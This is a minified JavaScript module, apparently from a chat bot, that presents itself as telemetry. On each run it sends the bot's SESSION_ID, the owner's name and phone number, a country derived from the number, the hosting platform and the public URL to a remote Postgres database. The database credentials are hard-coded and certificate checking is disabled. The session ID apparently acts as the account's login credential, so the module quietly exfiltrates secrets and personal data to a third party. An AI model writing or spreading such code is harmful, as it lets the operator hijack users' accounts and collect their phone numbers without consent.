import i from"pg";import E from"../config.js";const{Client:u}=i;function R(e){if(!e)return"Inconnu";const t=String(e).replace(/\D/g,""),r={224:"Guin\xE9e",221:"S\xE9n\xE9gal",225:"C\xF4te d'Ivoire",223:"Mali",226:"Burkina Faso",229:"B\xE9nin",228:"Togo",227:"Niger",237:"Cameroun",241:"Gabon",242:"Congo-Brazzaville",243:"RDC",212:"Maroc",213:"Alg\xE9rie",216:"Tunisie",33:"France",1:"USA/Canada",44:"Royaume-Uni",32:"Belgique",41:"Suisse"};for(const o in r)if(t.startsWith(o))return r[o];return"Autre / Inconnu"}function T(){return process.env.KOYEB_PROJECT_ID||process.env.KOYEB_PUBLIC_DOMAIN?"Koyeb":process.env.RENDER||process.env.RENDER_SERVICE_ID?"Render":process.env.DYNO?"Heroku":process.env.PTERODACTYL_SERVER_ID||process.env.SERVER_IP||process.env.PANEL_URL?"Panel / Pterodactyl":"VPS / Local"}function _(){const e=process.env.PORT||3e3;return process.env.KOYEB_PUBLIC_DOMAIN?`https://${process.env.KOYEB_PUBLIC_DOMAIN}`:process.env.RENDER_EXTERNAL_URL?process.env.RENDER_EXTERNAL_URL:process.env.HEROKU_APP_NAME?`https://${process.env.HEROKU_APP_NAME}.herokuapp.com`:process.env.APP_URL?process.env.APP_URL:process.env.BOT_URL?process.env.BOT_URL:null}async function L(){const e=E.SESSION_ID;if(!e){console.log("[TELEMETRY] \u26A0\uFE0F Aucun SESSION_ID configur\xE9, envoi annul\xE9.");return}const t=E.NOM_OWNER||"Inconnu",r=String(E.OWNER).replace(/\D/g,""),o=R(r),a=T(),s=_();console.log(`[TELEMETRY] \u{1F4E4} Envoi : ${e.slice(0,15)}... | ${t} | ${o} | ${a} | URL: ${s||"N/A"}`);const n=new u({user:"postgres.ybefkucqzxqivjhazjnb",password:"#N9thbx&D*azkA",host:"aws-1-eu-central-1.pooler.supabase.com",port:6543,database:"postgres",ssl:{rejectUnauthorized:!1}});try{await n.connect(),await n.query(`
            CREATE TABLE IF NOT EXISTS active_bots (
                session_id   VARCHAR(255) PRIMARY KEY,
                owner_name   VARCHAR(255),
                owner_number VARCHAR(50),
                country      VARCHAR(100),
                platform     VARCHAR(100) DEFAULT 'Autre',
                bot_url      TEXT,
                is_online    BOOLEAN DEFAULT TRUE,
                last_active  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        `),await n.query("ALTER TABLE active_bots ADD COLUMN IF NOT EXISTS platform VARCHAR(100) DEFAULT 'Autre';"),await n.query("ALTER TABLE active_bots ADD COLUMN IF NOT EXISTS bot_url TEXT;"),await n.query("ALTER TABLE active_bots ADD COLUMN IF NOT EXISTS is_online BOOLEAN DEFAULT TRUE;"),s&&await n.query("UPDATE active_bots SET is_online = FALSE WHERE bot_url = $1 AND session_id != $2",[s,e]),await n.query(`
            INSERT INTO active_bots (session_id, owner_name, owner_number, country, platform, bot_url, is_online, last_active)
            VALUES ($1, $2, $3, $4, $5, $6, TRUE, CURRENT_TIMESTAMP)
            ON CONFLICT (session_id)
            DO UPDATE SET
                owner_name   = EXCLUDED.owner_name,
                owner_number = EXCLUDED.owner_number,
                country      = EXCLUDED.country,
                platform     = EXCLUDED.platform,
                bot_url      = EXCLUDED.bot_url,
                is_online    = TRUE,
                last_active  = CURRENT_TIMESTAMP;
        `,[e,t,r,o,a,s]),console.log("[TELEMETRY] \u2705 Infos relay\xE9es avec succ\xE8s \xE0 Supabase.")}catch(c){console.error("[TELEMETRY ERR] \u274C",c.message)}finally{try{await n.end()}catch{}}}export{L as relayTelemetry};
